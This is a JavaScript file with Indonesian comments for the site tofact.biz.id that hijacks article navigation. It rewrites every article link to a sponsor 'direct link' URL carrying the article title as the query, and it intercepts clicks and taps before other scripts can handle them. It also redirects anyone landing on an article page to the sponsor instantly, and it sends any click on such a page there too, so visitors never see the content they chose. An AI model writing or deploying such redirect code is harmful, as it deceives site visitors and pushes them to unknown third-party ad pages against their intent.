/**
 * ==============================================================================
 * CENTRAL DIRECT LINK & SMARTLINK MANAGER (tofact.biz.id)
 * ==============================================================================
 * Mengarahkan setiap klik link artikel langsung ke URL direct link sponsor
 * dengan parameter query {QUERY} otomatis terisi judul artikel yang diklik.
 * ==============================================================================
 */

// 1. URL TARGET DIRECT LINK SPONSOR
const DIRECT_LINK_TEMPLATE = "https://tutaniaunfastrothermuck.com/NarbK4ffacdda7b2c20d6896e4223d8738217c26f943f?q={QUERY}";

// 2. KONFIGURASI PERILAKU
const CONFIG = {
    // Setiap klik link artikel langsung diarahkan ke direct link
    interceptArticleClicks: true,

    // Ganti atribut href artikel di halaman agar saat di-hover/tengah-klik langsung menuju direct link
    rewriteHrefs: true,

    // Auto-redirect jika pengunjung membuka/mendarat langsung di halaman artikel (articleX.html)
    autoRedirectOnArticle: true,
    articleRedirectDelayMs: 0, // 0 = instan tanpa jeda

    // Klik di mana saja saat berada di halaman artikel mengarah ke direct link
    clickAnywhereOnArticle: true
};

// ==============================================================================
// SISTEM ENGINE PENGALIHAN CERDAS
// ==============================================================================
(function () {
    function cleanQuery(text) {
        if (!text) return "";
        let clean = text.replace(/<[^>]+>/g, " ");
        clean = clean.replace(/Trending now/gi, "");
        clean = clean.replace(/John Doe/gi, "");
        clean = clean.replace(/[A-Za-z]+\s\d{1,2},\s\d{4}/g, ""); // Hapus format tanggal
        clean = clean.replace(/TOFACT/gi, "");
        clean = clean.replace(/IT Magazine/gi, "");
        clean = clean.replace(/\|\s*To Fact/gi, "");
        clean = clean.replace(/\s+/g, " ").trim();
        return clean;
    }

    function buildDirectLink(rawQuery) {
        let q = cleanQuery(rawQuery);
        if (!q || q.length < 3) q = "Technology Trends 2026";
        return DIRECT_LINK_TEMPLATE.replace("{QUERY}", encodeURIComponent(q));
    }

    function extractQueryFromLink(linkEl) {
        if (!linkEl) return "Technology Insights";

        // 1. Heading di dalam link
        const heading = linkEl.querySelector("h1, h2, h3, h4, h5, .trending-title, .article-title");
        if (heading && heading.textContent.trim()) {
            return cleanQuery(heading.textContent);
        }

        // 2. Heading di container/card pembungkus
        const card = linkEl.closest(".hero-item, .dont-miss-main, .dont-miss-small, .list-post, .trending-bar, .article-card, article, li, div");
        if (card) {
            const cardHeading = card.querySelector("h1, h2, h3, h4, h5, .trending-title, .article-title");
            if (cardHeading && cardHeading.textContent.trim()) {
                return cleanQuery(cardHeading.textContent);
            }
        }

        // 3. Teks link langsung
        const text = linkEl.textContent.trim();
        if (text && text.length > 5 && !/read more|view all|more|details|home/i.test(text)) {
            return cleanQuery(text);
        }

        // 4. Atribut alt gambar
        const img = linkEl.querySelector("img[alt]");
        if (img && img.alt && !/featured|ad|banner|image/i.test(img.alt)) {
            return cleanQuery(img.alt);
        }

        // 5. Fallback nomor artikel
        const href = linkEl.getAttribute("href") || "";
        const m = href.match(/article(\d+)/i);
        if (m) {
            return "Technology Trends Article " + m[1];
        }

        return "Technology Trends";
    }

    function rewriteAllArticleLinks() {
        if (!CONFIG.rewriteHrefs) return;
        const links = document.querySelectorAll('a[href*="article"], a[href*="articles/"]');
        links.forEach(function (link) {
            const query = extractQueryFromLink(link);
            const directUrl = buildDirectLink(query);
            link.setAttribute("data-direct-url", directUrl);
            link.setAttribute("href", directUrl);
            link.setAttribute("target", "_self");
        });
    }

    // Intersepsi Klik Artikel (Fase Capture agar langsung redirect sebelum script lain)
    if (CONFIG.interceptArticleClicks) {
        document.addEventListener(
            "click",
            function (e) {
                const link = e.target.closest('a[href*="article"], a[href*="articles/"], a[data-direct-url]');
                if (link) {
                    e.preventDefault();
                    e.stopPropagation();
                    const directUrl = link.getAttribute("data-direct-url") || buildDirectLink(extractQueryFromLink(link));
                    window.location.href = directUrl;
                    return false;
                }
            },
            true
        );

        // Dukungan layar sentuh / mobile
        document.addEventListener(
            "touchend",
            function (e) {
                const link = e.target.closest('a[href*="article"], a[href*="articles/"], a[data-direct-url]');
                if (link) {
                    e.preventDefault();
                    e.stopPropagation();
                    const directUrl = link.getAttribute("data-direct-url") || buildDirectLink(extractQueryFromLink(link));
                    window.location.href = directUrl;
                    return false;
                }
            },
            { capture: true, passive: false }
        );
    }

    // Jalankan rewrite link begitu DOM siap
    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", rewriteAllArticleLinks);
    } else {
        rewriteAllArticleLinks();
    }
    window.addEventListener("load", rewriteAllArticleLinks);

    // Pengalihan jika membuka halaman artikel secara langsung (articleX.html)
    const isArticlePage = window.location.pathname.includes("/articles/") || /article\d+\.html/i.test(window.location.pathname);
    if (isArticlePage) {
        function getArticleDirectUrl() {
            const heading = document.querySelector("h1.article-title") || document.querySelector("h1") || document.querySelector(".article-title");
            const rawTitle = heading ? heading.textContent : document.title;
            return buildDirectLink(rawTitle);
        }

        if (CONFIG.autoRedirectOnArticle) {
            const targetUrl = getArticleDirectUrl();
            if (CONFIG.articleRedirectDelayMs > 0) {
                setTimeout(function () {
                    window.location.replace(targetUrl);
                }, CONFIG.articleRedirectDelayMs);
            } else {
                window.location.replace(targetUrl);
            }
        }

        if (CONFIG.clickAnywhereOnArticle) {
            window.addEventListener(
                "click",
                function () {
                    window.location.href = getArticleDirectUrl();
                },
                { once: true, capture: true }
            );
        }
    }
})();
